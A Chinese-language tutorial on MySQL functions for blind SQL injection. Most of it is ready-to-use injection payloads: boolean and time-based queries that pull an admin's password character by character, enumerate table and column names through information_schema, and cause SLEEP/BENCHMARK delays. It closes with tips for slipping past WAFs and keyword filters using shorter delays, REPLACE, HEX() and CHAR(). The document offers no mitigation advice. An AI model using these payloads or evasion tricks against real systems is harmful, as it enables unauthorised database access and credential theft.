以下是MySQL盲注（Blind SQL Injection）中**核心函数**的详细用法解析

---

### **一、条件判断函数**

#### 1. `IF(condition, true_val, false_val)`

**用途**：通过布尔结果差异判断数据内容  
**示例**：

`SELECT IF(ASCII(SUBSTRING(database(),1,1))=97, 'admin', 'guest')  -- 若数据库首字母为'a'则返回'admin'，否则返回'guest'`

**关键点**：

- 常配合`SUBSTRING`逐字符测试
- 页面不同响应（如登录成功/失败）可推断条件真假

#### 2. `CASE WHEN ... THEN ... ELSE ... END`

**用途**：多条件分支判断  
**示例**：

`SELECT CASE      WHEN (SELECT COUNT(*) FROM users)>0 THEN 'exist'    ELSE 'empty'  END`

**优势**：比`IF`更灵活，适合复杂逻辑链

---

### **二、字符串截取函数**

#### 3. `SUBSTRING(str, pos, len)`

**参数说明**：

- `pos`：起始位置（从1开始）
- `len`：截取长度（可省略，默认到结尾）  
  **实战用例**：

`SUBSTRING((SELECT password FROM users LIMIT 1),2,1)='b'  -- 测试密码第2个字符是否为'b'`

**变体**：`MID(str,pos,len)`功能相同

#### 4. `LEFT(str, len)`

**典型场景**：快速测试前缀

`LEFT((SELECT table_name FROM information_schema.tables  LIMIT 1),3)='use'  -- 检查表名前3字符是否为'use'`

---

### **三、时间延迟函数**

#### 5. `SLEEP(seconds)`

**时间盲注核心**：

`SELECT * FROM users WHERE IF(1=1, SLEEP(5), 0) -- 条件为真时触发5秒延迟`

**绕过技巧**：

- 缩短延迟时间（如`SLEEP(0.5)`）避免触发WAF
- 配合`BENCHMARK`增加隐蔽性

#### 6. `BENCHMARK(count, expr)`

**替代延迟方案**：

`IF(ASCII(database())=97, BENCHMARK(10000000,SHA1('test')), NULL) -- 通过CPU密集计算制造延迟`

---

### **四、辅助工具函数**

#### 7. `ASCII(char)`

**字符数字化**：

`ASCII(SUBSTRING((SELECT username FROM users LIMIT 1),1,1))>100  -- 将字符转为ASCII码比较数值范围` 

**注意**：

- 扩展函数`ORD(char)`支持多字节字符

#### 8. `LENGTH(str)`

**长度探测**：

`LENGTH((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables))>10   -- 判断所有表名拼接后的长度` 

---

### **五、函数组合实战案例**

#### 布尔盲注攻击链：

`SELECT * FROM products WHERE id=1 AND IF(     ASCII(SUBSTRING(        (SELECT password FROM users WHERE username='admin' LIMIT 1),        5,1    ))=95,    1,    0  ) -- 检查管理员密码第5个字符是否为下划线'_'`

#### 时间盲注攻击链：

`SELECT * FROM orders WHERE IF(     EXISTS(SELECT * FROM information_schema.columns  WHERE column_name LIKE '%pass%'),    SLEEP(3),    0  ) -- 若存在包含'pass'的字段名则延迟3秒` 

---

### **防御规避建议**

1. **函数替代**：
   - `REPLACE(SUBSTRING(str,1,1),'a','')=''` 替代直接字符比较
2. **编码混淆**：
   - 使用`HEX()`或`CHAR()`函数绕过关键词过滤
